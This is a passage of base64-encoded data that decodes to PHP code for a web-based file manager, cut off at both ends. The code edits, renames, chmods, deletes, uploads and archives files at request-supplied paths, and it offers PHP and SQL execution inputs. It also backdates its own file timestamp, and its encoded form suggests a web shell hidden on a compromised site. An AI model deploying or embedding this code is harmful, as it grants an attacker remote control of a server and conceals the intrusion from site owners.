WZvcmVhY2ggKCR0bXBsIGFzICRrZXk9PiR2YWx1ZSl7CgkJJHNlbGVjdC49JzxvcHRpb24gdmFsdWU9IicuJHZhbHVlLiciICcuKCghZW1wdHkoJHZhbHVlKSYmKCR2YWx1ZT09JGFjdGl2ZSkpPydzZWxlY3RlZCc6JycpLicgPicuX18oJGtleSkuIjwvb3B0aW9uPlxuIjsKCX0KCSRzZWxlY3QgLj0gIjwvc2VsZWN0PlxuIjsKCWVjaG8gJHNlbGVjdDsKfQo/PgoJCTwvZm9ybT4KCTwvdGQ+CjwvdHI+CjwvdGFibGU+Cjw/cGhwCglpZiAoIWVtcHR5KCRyZXMpKSB7CgkJJGZ1bj0nZm1fJy4kcmVzX2xuZzsKCQllY2hvICc8aDM+Jy5zdHJ0b3VwcGVyKCRyZXNfbG5nKS4nICcuX18oJ1Jlc3VsdCcpLic8L2gzPjxwcmU+Jy4kZnVuKCRyZXMpLic8L3ByZT4nOwoJfQp9IGVsc2VpZiAoIWVtcHR5KCRfUkVRVUVTVFsnZWRpdCddKSl7CglpZighZW1wdHkoJF9SRVFVRVNUWydzYXZlJ10pKSB7CgkJJGZuID0gJHBhdGggLiAkX1JFUVVFU1RbJ2VkaXQnXTsKCQkkZmlsZW10aW1lID0gZmlsZW10aW1lKCRmbik7CgkgICAgaWYgKGZpbGVfcHV0X2NvbnRlbnRzKCRmbiwgJF9SRVFVRVNUWyduZXdjb250ZW50J10pKSAkbXNnIC49IF9fKCdGaWxlIHVwZGF0ZWQnKTsKCQllbHNlICRtc2cgLj0gX18oJ0Vycm9yIG9jY3VycmVkJyk7CgkJaWYgKCRfR0VUWydlZGl0J109PWJhc2VuYW1lKF9fRklMRV9fKSkgewoJCQl0b3VjaChfX0ZJTEVfXywxNDE1MTE2MzcxKTsKCQl9IGVsc2UgewoJCQlpZiAoIWVtcHR5KCRmbV9jb25maWdbJ3Jlc3RvcmVfdGltZSddKSkgdG91Y2goJGZuLCRmaWxlbXRpbWUpOwoJCX0KCX0KICAgICRvbGRjb250ZW50ID0gQGZpbGVfZ2V0X2NvbnRlbnRzKCRwYXRoIC4gJF9SRVFVRVNUWydlZGl0J10pOwogICAgJGVkaXRsaW5rID0gJHVybF9pbmMgLiAnJmVkaXQ9JyAuICRfUkVRVUVTVFsnZWRpdCddIC4gJyZwYXRoPScgLiAkcGF0aDsKICAgICRiYWNrbGluayA9ICR1cmxfaW5jIC4gJyZwYXRoPScgLiAkcGF0aDsKPz4KPHNjcmlwdCBzcmM9Imh0dHBzOi8vY2RuLmpzZGVsaXZyLm5ldC9naC9EZW4xeHh4L0VkaXRBcmVhQG1hc3Rlci9lZGl0X2FyZWEvZWRpdF9hcmVhX2Z1bGwuanMiPjwvc2NyaXB0Pgo8dGFibGUgYm9yZGVyPScwJyBjZWxsc3BhY2luZz0nMCcgY2VsbHBhZGRpbmc9JzEnIHdpZHRoPSIxMDAlIj4KPHRyPgogICAgPHRoPjw/PV9fKCdGaWxlIG1hbmFnZXInKS4nIC0gJy5fXygnRWRpdCcpLicgLSAnLiRwYXRoLiRfUkVRVUVTVFsnZWRpdCddPz48L3RoPgo8L3RyPgo8dHI+CiAgICA8dGQgY2xhc3M9InJvdzEiPgogICAgICAgIDw/PSRtc2c/PgoJPC90ZD4KPC90cj4KPHRyPgogICAgPHRkIGNsYXNzPSJyb3cxIj4KICAgICAgICA8Pz1mbV9ob21lKCk/PiA8YSBocmVmPSI8Pz0kYmFja2xpbms/PiI+PD89X18oJ0JhY2snKT8+PC9hPgoJPC90ZD4KPC90cj4KPHRyPgogICAgPHRkIGNsYXNzPSJyb3cxIiBhbGlnbj0iY2VudGVyIj4KICAgICAgICA8Zm9ybSBuYW1lPSJmb3JtMSIgbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/PSRlZGl0bGluaz8+Ij4KICAgICAgICAgICAgPHRleHRhcmVhIG5hbWU9Im5ld2NvbnRlbnQiIGlkPSJuZXdjb250ZW50IiBjb2xzPSI0NSIgcm93cz0iMjUiIHN0eWxlPSJ3aWR0aDo5OSUiIHNwZWxsY2hlY2s9ImZhbHNlIj48Pz1odG1sc3BlY2lhbGNoYXJzKCRvbGRjb250ZW50KT8+PC90ZXh0YXJlYT4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2F2ZSIgdmFsdWU9Ijw/PV9fKCdTdWJtaXQnKT8+Ij4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0iY2FuY2VsIiB2YWx1ZT0iPD89X18oJ0NhbmNlbCcpPz4iPgogICAgICAgIDwvZm9ybT4KICAgIDwvdGQ+CjwvdHI+CjwvdGFibGU+CjxzY3JpcHQgbGFuZ3VhZ2U9IkphdmFzY3JpcHQiIHR5cGU9InRleHQvamF2YXNjcmlwdCI+CmRvY3VtZW50LmFkZEV2ZW50TGlzdGVuZXIoJ0RPTUNvbnRlbnRMb2FkZWQnLCBmdW5jdGlvbigpIHsKCWVkaXRBcmVhTG9hZGVyLmluaXQoewoJaWQ6ICJuZXdjb250ZW50IgoJLGRpc3BsYXk6ICJsYXRlciIKCSxzdGFydF9oaWdobGlnaHQ6IHRydWUKCSxhbGxvd19yZXNpemU6ICJib3RoIgoJLGFsbG93X3RvZ2dsZTogdHJ1ZQoJLHdvcmRfd3JhcDogdHJ1ZQoJLGxhbmd1YWdlOiAicnUiCgksc3ludGF4OiAiPD89cGF0aGluZm8oJF9SRVFVRVNUWydlZGl0J10sIFBBVEhJTkZPX0VYVEVOU0lPTik/PiIJCgksdG9vbGJhcjogInNlYXJjaCwgZ29fdG9fbGluZSwgfCwgdW5kbywgcmVkbywgfCwgc2VsZWN0X2ZvbnQsIHwsIHN5bnRheF9zZWxlY3Rpb24sIHwsIGNoYW5nZV9zbW9vdGhfc2VsZWN0aW9uLCBoaWdobGlnaHQsIHJlc2V0X2hpZ2hsaWdodCwgfCwgaGVscCIKCSxzeW50YXhfc2VsZWN0aW9uX2FsbG93OiAiY3NzLGh0bWwsanMscGhwLHB5dGhvbix4bWwsYyxjcHAsc3FsLGJhc2ljLHBhcyIKCX0pOwp9KTsKPC9zY3JpcHQ+Cjw/cGhwCmVjaG8gJGF1dGhbJ3NjcmlwdCddOwp9IGVsc2VpZighZW1wdHkoJF9SRVFVRVNUWydyaWdodHMnXSkpewoJaWYoIWVtcHR5KCRfUkVRVUVTVFsnc2F2ZSddKSkgewoJICAgIGlmKGZtX2NobW9kKCRwYXRoIC4gJF9SRVFVRVNUWydyaWdodHMnXSwgZm1fY29udmVydF9yaWdodHMoJF9SRVFVRVNUWydyaWdodHNfdmFsJ10pLCBAJF9SRVFVRVNUWydyZWN1cnNpdmVseSddKSkKCQkkbXNnIC49IChfXygnRmlsZSB1cGRhdGVkJykpOyAKCQllbHNlICRtc2cgLj0gKF9fKCdFcnJvciBvY2N1cnJlZCcpKTsKCX0KCWNsZWFyc3RhdGNhY2hlKCk7CiAgICAkb2xkcmlnaHRzID0gZm1fcmlnaHRzX3N0cmluZygkcGF0aCAuICRfUkVRVUVTVFsncmlnaHRzJ10sIHRydWUpOwogICAgJGxpbmsgPSAkdXJsX2luYyAuICcmcmlnaHRzPScgLiAkX1JFUVVFU1RbJ3JpZ2h0cyddIC4gJyZwYXRoPScgLiAkcGF0aDsKICAgICRiYWNrbGluayA9ICR1cmxfaW5jIC4gJyZwYXRoPScgLiAkcGF0aDsKPz4KPHRhYmxlIGNsYXNzPSJ3aG9sZSI+Cjx0cj4KICAgIDx0aD48Pz1fXygnRmlsZSBtYW5hZ2VyJykuJyAtICcuJHBhdGg/PjwvdGg+CjwvdHI+Cjx0cj4KICAgIDx0ZCBjbGFzcz0icm93MSI+CiAgICAgICAgPD89JG1zZz8+Cgk8L3RkPgo8L3RyPgo8dHI+CiAgICA8dGQgY2xhc3M9InJvdzEiPgogICAgICAgIDxhIGhyZWY9Ijw/PSRiYWNrbGluaz8+Ij48Pz1fXygnQmFjaycpPz48L2E+Cgk8L3RkPgo8L3RyPgo8dHI+CiAgICA8dGQgY2xhc3M9InJvdzEiIGFsaWduPSJjZW50ZXIiPgogICAgICAgIDxmb3JtIG5hbWU9ImZvcm0xIiBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPD89JGxpbms/PiI+CiAgICAgICAgICAgPD89X18oJ1JpZ2h0cycpLicgLSAnLiRfUkVRVUVTVFsncmlnaHRzJ10/PiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0icmlnaHRzX3ZhbCIgdmFsdWU9Ijw/PSRvbGRyaWdodHM/PiI+CiAgICAgICAgPD9waHAgaWYgKGlzX2RpcigkcGF0aC4kX1JFUVVFU1RbJ3JpZ2h0cyddKSkgeyA/PgogICAgICAgICAgICA8aW5wdXQgdHlwZT0iY2hlY2tib3giIG5hbWU9InJlY3Vyc2l2ZWx5IiB2YWx1ZT0iMSI+IDw/PV9fKCdSZWN1cnNpdmVseScpPz48YnIvPgogICAgICAgIDw/cGhwIH0gPz4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2F2ZSIgdmFsdWU9Ijw/PV9fKCdTdWJtaXQnKT8+Ij4KICAgICAgICA8L2Zvcm0+CiAgICA8L3RkPgo8L3RyPgo8L3RhYmxlPgo8P3BocAp9IGVsc2VpZiAoIWVtcHR5KCRfUkVRVUVTVFsncmVuYW1lJ10pJiYkX1JFUVVFU1RbJ3JlbmFtZSddPD4nLicpIHsKCWlmKCFlbXB0eSgkX1JFUVVFU1RbJ3NhdmUnXSkpIHsKCSAgICByZW5hbWUoJHBhdGggLiAkX1JFUVVFU1RbJ3JlbmFtZSddLCAkcGF0aCAuICRfUkVRVUVTVFsnbmV3bmFtZSddKTsKCQkkbXNnIC49IChfXygnRmlsZSB1cGRhdGVkJykpOwoJCSRfUkVRVUVTVFsncmVuYW1lJ10gPSAkX1JFUVVFU1RbJ25ld25hbWUnXTsKCX0KCWNsZWFyc3RhdGNhY2hlKCk7CiAgICAkbGluayA9ICR1cmxfaW5jIC4gJyZyZW5hbWU9JyAuICRfUkVRVUVTVFsncmVuYW1lJ10gLiAnJnBhdGg9JyAuICRwYXRoOwogICAgJGJhY2tsaW5rID0gJHVybF9pbmMgLiAnJnBhdGg9JyAuICRwYXRoOwoKPz4KPHRhYmxlIGNsYXNzPSJ3aG9sZSI+Cjx0cj4KICAgIDx0aD48Pz1fXygnRmlsZSBtYW5hZ2VyJykuJyAtICcuJHBhdGg/PjwvdGg+CjwvdHI+Cjx0cj4KICAgIDx0ZCBjbGFzcz0icm93MSI+CiAgICAgICAgPD89JG1zZz8+Cgk8L3RkPgo8L3RyPgo8dHI+CiAgICA8dGQgY2xhc3M9InJvdzEiPgogICAgICAgIDxhIGhyZWY9Ijw/PSRiYWNrbGluaz8+Ij48Pz1fXygnQmFjaycpPz48L2E+Cgk8L3RkPgo8L3RyPgo8dHI+CiAgICA8dGQgY2xhc3M9InJvdzEiIGFsaWduPSJjZW50ZXIiPgogICAgICAgIDxmb3JtIG5hbWU9ImZvcm0xIiBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPD89JGxpbms/PiI+CiAgICAgICAgICAgIDw/PV9fKCdSZW5hbWUnKT8+OiA8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0ibmV3bmFtZSIgdmFsdWU9Ijw/PSRfUkVRVUVTVFsncmVuYW1lJ10/PiI+PGJyLz4KICAgICAgICAgICAgPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2F2ZSIgdmFsdWU9Ijw/PV9fKCdTdWJtaXQnKT8+Ij4KICAgICAgICA8L2Zvcm0+CiAgICA8L3RkPgo8L3RyPgo8L3RhYmxlPgo8P3BocAp9IGVsc2UgewovL0xldCdzIHJvY2shCiAgICAkbXNnID0gJyc7CiAgICBpZighZW1wdHkoJF9GSUxFU1sndXBsb2FkJ10pJiYhZW1wdHkoJGZtX2NvbmZpZ1sndXBsb2FkX2ZpbGUnXSkpIHsKICAgICAgICBpZighZW1wdHkoJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSkpewogICAgICAgICAgICAkX0ZJTEVTWyd1cGxvYWQnXVsnbmFtZSddID0gc3RyX3JlcGxhY2UoJyUnLCAnJywgJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSk7CiAgICAgICAgICAgIGlmKCFtb3ZlX3VwbG9hZGVkX2ZpbGUoJF9GSUxFU1sndXBsb2FkJ11bJ3RtcF9uYW1lJ10sICRwYXRoIC4gJF9GSUxFU1sndXBsb2FkJ11bJ25hbWUnXSkpewogICAgICAgICAgICAgICAgJG1zZyAuPSBfXygnRXJyb3Igb2NjdXJyZWQnKTsKICAgICAgICAgICAgfSBlbHNlIHsKCQkJCSRtc2cgLj0gX18oJ0ZpbGVzIHVwbG9hZGVkJykuJzogJy4kX0ZJTEVTWyd1cGxvYWQnXVsnbmFtZSddOwoJCQl9CiAgICAgICAgfQogICAgfSBlbHNlaWYoIWVtcHR5KCRfUkVRVUVTVFsnZGVsZXRlJ10pJiYkX1JFUVVFU1RbJ2RlbGV0ZSddPD4nLicpIHsKICAgICAgICBpZighZm1fZGVsX2ZpbGVzKCgkcGF0aCAuICRfUkVRVUVTVFsnZGVsZXRlJ10pLCB0cnVlKSkgewogICAgICAgICAgICAkbXNnIC49IF9fKCdFcnJvciBvY2N1cnJlZCcpOwogICAgICAgIH0gZWxzZSB7CgkJCSRtc2cgLj0gX18oJ0RlbGV0ZWQnKS4nICcuJF9SRVFVRVNUWydkZWxldGUnXTsKCQl9Cgl9IGVsc2VpZighZW1wdHkoJF9SRVFVRVNUWydta2RpciddKSYmIWVtcHR5KCRmbV9jb25maWdbJ21ha2VfZGlyZWN0b3J5J10pKSB7CiAgICAgICAgaWYoIUBta2RpcigkcGF0aCAuICRfUkVRVUVTVFsnZGlybmFtZSddLDA3NzcpKSB7CiAgICAgICAgICAgICRtc2cgLj0gX18oJ0Vycm9yIG9jY3VycmVkJyk7CiAgICAgICAgfSBlbHNlIHsKCQkJJG1zZyAuPSBfXygnQ3JlYXRlZCcpLicgJy4kX1JFUVVFU1RbJ2Rpcm5hbWUnXTsKCQl9CiAgICB9IGVsc2VpZighZW1wdHkoJF9QT1NUWydzZWFyY2hfcmVjdXJzaXZlJ10pKSB7CgkJaW5pX3NldCgnbWF4X2V4ZWN1dGlvbl90aW1lJywgJzAnKTsKCQkkc2VhcmNoX2RhdGEgPSAgZmluZF90ZXh0X2luX2ZpbGVzKCRfUE9TVFsncGF0aCddLCAkX1BPU1RbJ21hc2snXSwgJF9QT1NUWydzZWFyY2hfcmVjdXJzaXZlJ10pOwoJCWlmKCFlbXB0eSgkc2VhcmNoX2RhdGEpKSB7CgkJCSRtc2cgLj0gX18oJ0ZvdW5kIGluIGZpbGVzJykuJyAoJy5jb3VudCgkc2VhcmNoX2RhdGEpLicpOjxicj4nOwoJCQlmb3JlYWNoICgkc2VhcmNoX2RhdGEgYXMgJGZpbGVuYW1lKSB7CgkJCQkkbXNnIC49ICc8YSBocmVmPSInLmZtX3VybCh0cnVlKS4nP2ZtPXRydWUmZWRpdD0nLmJhc2VuYW1lKCRmaWxlbmFtZSkuJyZwYXRoPScuc3RyX3JlcGxhY2UoJy8nLmJhc2VuYW1lKCRmaWxlbmFtZSksJy8nLCRmaWxlbmFtZSkuJyIgdGl0bGU9IicgLiBfXygnRWRpdCcpIC4gJyI+Jy5iYXNlbmFtZSgkZmlsZW5hbWUpLic8L2E+Jm5ic3A7ICZuYnNwOyc7CgkJCX0KCQl9IGVsc2UgewoJCQkkbXNnIC49IF9fKCdOb3RoaW5nIGZvdW5kZWQnKTsKCQl9CQoJfSBlbHNlaWYoIWVtcHR5KCRfUkVRVUVTVFsnbWtmaWxlJ10pJiYhZW1wdHkoJGZtX2NvbmZpZ1snbmV3X2ZpbGUnXSkpIHsKICAgICAgICBpZighJGZwPUBmb3BlbigkcGF0aCAuICRfUkVRVUVTVFsnZmlsZW5hbWUnXSwidyIpKSB7CiAgICAgICAgICAgICRtc2cgLj0gX18oJ0Vycm9yIG9jY3VycmVkJyk7CiAgICAgICAgfSBlbHNlIHsKCQkJZmNsb3NlKCRmcCk7CgkJCSRtc2cgLj0gX18oJ0NyZWF0ZWQnKS4nICcuJF9SRVFVRVNUWydmaWxlbmFtZSddOwoJCX0KICAgIH0gZWxzZWlmIChpc3NldCgkX0dFVFsnemlwJ10pKSB7CgkJJHNvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJF9HRVRbJ3ppcCddKTsKCQkkZGVzdGluYXRpb24gPSBiYXNlbmFtZSgkc291cmNlKS4nLnppcCc7CgkJc2V0X3RpbWVfbGltaXQoMCk7CgkJJHBoYXIgPSBuZXcgUGhhckRhdGEoJGRlc3RpbmF0aW9uKTsKCQkkcGhhci0+YnVpbGRGcm9tRGlyZWN0b3J5KCRzb3VyY2UpOwoJCWlmIChpc19maWxlKCRkZXN0aW5hdGlvbikpCgkJJG1zZyAuPSBfXygnVGFzaycpLicgIicuX18oJ0FyY2hpdmluZycpLicgJy4kZGVzdGluYXRpb24uJyIgJy5fXygnZG9uZScpLgoJCScuJm5ic3A7Jy5mbV9saW5rKCdkb3dubG9hZCcsJHBhdGguJGRlc3RpbmF0aW9uLF9fKCdEb3dubG9hZCcpLF9fKCdEb3dubG9hZCcpLicgJy4gJGRlc3RpbmF0aW9uKQoJCS4nJm5ic3A7PGEgaHJlZj0iJy4kdXJsX2luYy4nJmRlbGV0ZT0nLiRkZXN0aW5hdGlvbi4nJnBhdGg9JyAuICRwYXRoLiciIHRpdGxlPSInLl9fKCdEZWxldGUnKS4nICcuICRkZXN0aW5hdGlvbi4nIiA+Jy5fXygnRGVsZXRlJykgLiAnPC9hPic7CgkJZWxzZSAkbXNnIC49IF9fKCdFcnJvciBvY2N1cnJlZCcpLic6ICcuX18oJ25vIGZpbGVzJyk7Cgl9IGVsc2VpZiAoaXNzZXQoJF9HRVRbJ2d6J10pKSB7CgkJJHNvdXJjZSA9IGJhc2U2NF9kZWNvZGUoJF9HRVRbJ2d6J10pOwoJCSRhcmNoaXZlID0gJHNvdXJjZS4nLnRhcic7CgkJJGRlc3RpbmF0aW9uID0gYmFzZW5hbWUoJHNvdXJjZSkuJy50YXInOwoJCWlmIChpc19maWxlKCRhcmNoaXZlKSkgdW5saW5rKCRhcmNoaXZlKTsKCQlpZiAoaXNfZmlsZSgkYXJjaGl2ZS4nLmd6JykpIHVubGluaygkYXJjaGl2ZS4nLmd6Jyk7CgkJY2xlYXJzdGF0Y2FjaGUoKTsKCQlzZXRfdGltZV9saW1pdCgwKTsKCQkvL2RpZSgpOwoJCSRwaGFyID0gbmV3IFBoYXJEYXRhKCRkZXN0aW5hdGlvbik7CgkJJHBoYXItPmJ1aWxkRnJvbURpcmVjdG9yeSgkc291cmNlKTsKCQkkcGhhci0+Y29tcHJlc3MoUGhhcjo6R1osJy50YXIuZ3onKTsKCQl1bnNldCgkcGhhcik7CgkJaWYgKGlzX2ZpbGUoJGFyY2hpdmUpKSB7CgkJCWlmIChpc19maWxlKCRhcmNoaXZlLicuZ3onKSkgewoJCQkJdW5saW5rKCRhcmNoaXZlKTsgCgkJCQkkZGVzdGluYXRpb24gLj0gJy5neic7CgkJCX0KCgkJCSRtc2cgLj0gX18oJ1Rhc2snKS4nICInLl9fKCdBcmNoaXZpbmcnKS4nICcuJGRlc3RpbmF0aW9uLiciICcuX18oJ2RvbmUnKS4KCQkJJy4mbmJzcDsnLmZtX2xpbmsoJ2Rvd25sb2FkJywkcGF0aC4kZGVzdGluYXRpb24sX18oJ0Rvd25sb2FkJyksX18oJ0Rvd25sb2FkJykuJyAnLiAkZGVzdGluYXRpb24pCgkJCS4nJm5ic3A7PGEgaHJlZj0iJy4kdXJsX2luYy4nJmRlbGV0ZT0nLiRkZXN0aW5hdGlvbi4nJnBhdGg9JyAuICRwYXRoLiciIHRpdGxlPSInLl9fKCdEZWxldGUnKS4nICcuJGRlc3RpbmF0aW9uLiciID4nLl9fKCdEZWxldGUnKS4nPC9hPic7CgkJfSBlbHNlICRtc2cgLj0gX18oJ0Vycm9yIG9jY3VycmVkJykuJzogJy5fXygnbm8gZmlsZXMnKTsKCX0gZWxzZWlmIChpc3NldCgkX0dFVFsnZGVjb21wcmVzcyddKSkgewoJCS8vICRzb3VyY2UgPSBiYXNlNjRfZGVjb2RlKCRfR0VUWydkZWNvbXByZXNzJ10pOwoJCS8vICRkZXN0aW5hdGlvbiA9IGJhc2VuYW1lKCRzb3VyY2UpOwoJCS8vICRleHQgPSBlbmQoZXhwbG9kZSgiLiIsICRkZXN0aW5hdGlvbikpOwoJCS8vIGlmICgkZXh0PT0nemlwJyBPUiAkZXh0PT0nZ3onKSB7CgkJCS8vICRwaGFyID0gbmV3IFBoYXJEYXRhKCRzb3VyY2UpOwoJCQkvLyAkcGhhci0+ZGVjb21wcmVzcygpOwoJCQkvLyAkYmFzZV9maWxlID0gc3RyX3JlcGxhY2UoJy4nLiRleHQsJycsJGRlc3RpbmF0aW9uKTsKCQkJLy8gJGV4dCA9IGVuZChleHBsb2RlKCIuIiwgJGJhc2VfZmlsZSkpOwoJCQkvLyBpZiAoJGV4dD09J3RhcicpewoJCQkJLy8gJHBoYXIgPSBuZXcgUGhhckRhdGEoJGJhc2VfZmlsZSk7CgkJCQkvLyAkcGhhci0+ZXh0cmFjdFRvKGRpcigkc291cmNlKSk7CgkJCS8vIH0KCQkvLyB9IAoJCS8vICRtc2cgLj0gX18oJ1Rhc2snKS4nICInLl9fKCdEZWNvbXByZXNzJykuJyAnLiRzb3VyY2UuJyIgJy5fXygnZG9uZScpOwoJfSBlbHNlaWYgKGlzc2V0KCRfR0VUWydnemZpbGUnXSkpIHsKCQkkc291cmNlID0gYmFzZTY0X2RlY29kZSgkX0dFVFsnZ3pmaWxlJ10pOwoJCSRhcmNoaXZlID0gJHNvdXJjZS4nLnRhcic7CgkJJGRlc3RpbmF0aW9uID0gYmFzZW5hbWUoJHNvdXJjZSkuJy50YXInOwoJCWlmIChpc19maWxlKCRhcmNoaXZlKSkgdW5saW5rKCRhcmNoaXZlKTsKCQlpZiAoaXNfZmlsZSgkYXJjaGl2ZS4nLmd6JykpIHVubGluaygkYXJjaGl2ZS4nLmd6Jyk7CgkJc2V0X3RpbWVfbGltaXQoMCk7CgkJLy9lY2hvICRkZXN0aW5hdGlvbjsKCQkkZXh0X2FyciA9IGV4cGxvZGUoJy4nLGJhc2VuYW1lKCRzb3VyY2UpKTsKCQlpZiAoaXNzZXQoJGV4dF9hcnJbMV0pKSB7CgkJCXVuc2V0KCRleHRfYXJyWzBdKTsKCQkJJGV4dD1pbXBsb2RlKCcuJywkZXh0X2Fycik7CgkJfSAKCQkkcGhhciA9IG5ldyBQaGFyRGF0YSgkZGVzdGluYXRpb24pOwoJCSRwaGFyLT5hZGRGaWxlKCRzb3VyY2UpOwoJCSRwaGFyLT5jb21wcmVzcyhQaGFyOjpHWiwkZXh0LicudGFyLmd6Jyk7CgkJdW5zZXQoJHBoYXIpOwoJCWlmIChpc19maWxlKCRhcmNoaXZlKSkgewoJCQlpZiAoaXNfZmlsZSgkYXJjaGl2ZS4nLmd6JykpIHsKCQkJCXVubGluaygkYXJjaGl2ZSk7IAoJCQkJJGRlc3RpbmF0aW9uIC49ICcuZ3onOwoJCQl9CgkJCSRtc2cgLj0gX18oJ1Rhc2snKS4nICInLl9fKCdBcmNoaXZpbmcnKS4nICcuJGRlc3RpbmF0aW9uLiciICcuX18oJ2RvbmUnKS4KCQkJJy4mbmJzcDsnLmZtX2xpbmsoJ2Rvd25sb2FkJywkcGF0aC4kZGVzdGluYXRpb24sX18oJ0Rvd25sb2FkJyksX18oJ0Rvd25sb2FkJykuJyAnLiAkZGVzdGluYXRpb24pCgkJCS4nJm5ic3A7PGEgaHJlZj0iJy4kdXJsX2luYy4nJmRlbGV0ZT0nLiRkZXN0aW5hdGlvbi4nJnBhdGg9JyAuICRwYXRoLiciIHRpdGxlPSInLl9fKCdEZWxldGUnKS4nICcuJGRlc3RpbmF0aW9uLiciID4nLl9fKCdEZWxldGUnKS4nPC9hPic7CgkJfSBlbHNlICRtc2cgLj0gX18oJ0Vycm9yIG9jY3VycmVkJykuJzogJy5fXygnbm8gZmlsZXMnKTsKCX0KPz4KPHRhYmxlIGNsYXNzPSJ3aG9sZSIgaWQ9ImhlYWRlcl90YWJsZSIgPgo8dHI+CiAgICA8dGggY29sc3Bhbj0iMiI+PD89X18oJ0ZpbGUgbWFuYWdlcicpPz48Pz0oIWVtcHR5KCRwYXRoKT8nIC0gJy4kcGF0aDonJyk/PjwvdGg+CjwvdHI+Cjw/cGhwIGlmKCFlbXB0eSgkbXNnKSl7ID8+Cjx0cj4KCTx0ZCBjb2xzcGFuPSIyIiBjbGFzcz0icm93MiI+PD89JG1zZz8+PC90ZD4KPC90cj4KPD9waHAgfSA/Pgo8dHI+CiAgICA8dGQgY2xhc3M9InJvdzIiPgoJCTx0YWJsZT4KCQkJPHRyPgoJCQk8dGQ+CgkJCQk8Pz1mbV9ob21lKCk/PgoJCQk8L3RkPgoJCQk8dGQ+CgkJCTw/cGhwIGlmKCFlbXB0eSgkZm1fY29uZmlnWydtYWtlX2RpcmVjdG9yeSddKSkgeyA/PgoJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/PSR1cmxfaW5jPz4iPgoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9Ijw/PSRwYXRoPz4iIC8+CgkJCQk8aW5wdXQgdHlwZT0idGV4dCIgbmFtZT0iZGlybmFtZSIgc2l6ZT0iMTUiPgoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ibWtkaXIiIHZhbHVlPSI8Pz1fXygnTWFrZSBkaXJlY3RvcnknKT8+Ij4KCQkJCTwvZm9ybT4KCQkJPD9waHAgfSA/PgoJCQk8L3RkPgoJCQk8dGQ+CgkJCTw/cGhwIGlmKCFlbXB0eSgkZm1fY29uZmlnWyduZXdfZmlsZSddKSkgeyA/PgoJCQkJPGZvcm0gbWV0aG9kPSJwb3N0IiBhY3Rpb249Ijw/PSR1cmxfaW5jPz4iPgoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgICAgIHZhbHVlPSI8Pz0kcGF0aD8+IiAvPgoJCQkJPGlucHV0IHR5cGU9InRleHQiICAgbmFtZT0iZmlsZW5hbWUiIHNpemU9IjE1Ij4KCQkJCTxpbnB1dCB0eXBlPSJzdWJtaXQiIG5hbWU9Im1rZmlsZSIgICB2YWx1ZT0iPD89X18oJ05ldyBmaWxlJyk/PiI+CgkJCQk8L2Zvcm0+CgkJCTw/cGhwIH0gPz4KCQkJPC90ZD4KCQkJPHRkPgoJCQkJPGZvcm0gIG1ldGhvZD0icG9zdCIgYWN0aW9uPSI8Pz0kdXJsX2luYz8+IiBzdHlsZT0iZGlzcGxheTppbmxpbmUiPgoJCQkJPGlucHV0IHR5cGU9ImhpZGRlbiIgbmFtZT0icGF0aCIgdmFsdWU9Ijw/PSRwYXRoPz4iIC8+CgkJCQk8aW5wdXQgdHlwZT0idGV4dCIgcGxhY2Vob2xkZXI9Ijw/PV9fKCdSZWN1cnNpdmUgc2VhcmNoJyk/PiIgbmFtZT0ic2VhcmNoX3JlY3Vyc2l2ZSIgdmFsdWU9Ijw/PSFlbXB0eSgkX1BPU1RbJ3NlYXJjaF9yZWN1cnNpdmUnXSk/JF9QT1NUWydzZWFyY2hfcmVjdXJzaXZlJ106Jyc/PiIgc2l6ZT0iMTUiPgoJCQkJPGlucHV0IHR5cGU9InRleHQiIG5hbWU9Im1hc2siIHBsYWNlaG9sZGVyPSI8Pz1fXygnTWFzaycpPz4iIHZhbHVlPSI8Pz0hZW1wdHkoJF9QT1NUWydtYXNrJ10pPyRfUE9TVFsnbWFzayddOicqLionPz4iIHNpemU9IjUiPgoJCQkJPGlucHV0IHR5cGU9InN1Ym1pdCIgbmFtZT0ic2VhcmNoIiB2YWx1ZT0iPD89X18oJ1NlYXJjaCcpPz4iPgoJCQkJPC9mb3JtPgoJCQk8L3RkPgoJCQk8dGQ+CgkJCTw/PWZtX3J1bl9pbnB1dCgncGhwJyk/PgoJCQk8L3RkPgoJCQk8dGQ+CgkJCTw/PWZtX3J1bl9pbnB1dCgnc3FsJyk/PgoJCQk8L3RkPgoJCQk8L3RyPgoJCTwvdGFibGU+CiAgICA8L3RkPgogICAgPHRkIGNsYXNzPSJyb3czIj4KCQk8dGFibGU+CgkJPHRyPgoJCTx0ZD4KCQk8P3BocCBpZiAoIWVtcHR5KCRmbV9jb25maWdbJ3VwbG9hZF9maWxlJ10pKSB7ID8+CgkJCTxmb3JtIG5hbWU9ImZvcm0xIiBtZXRob2Q9InBvc3QiIGFjdGlvbj0iPD89JHVybF9pbmM/PiIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSI+CgkJCTxpbnB1dCB0eXBlPSJoaWRkZW4iIG5hbWU9InBhdGgiIHZhbHVlPSI8Pz0kcGF0aD8+IiAvPgoJCQk8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0idXBsb2FkIiBpZD0idXBsb2FkX2hpZGRlbiIgc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgZGlzcGxheTogYmxvY2s7IG92ZXJmbG93OiBoaWRkZW47IHdpZHRoOiAwOyBoZWlnaHQ6IDA7IGJvcmRlcjogMDsgcGFkZGluZzogMDsiIG9uY2hhbmdlPSJkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgndXBsb2FkX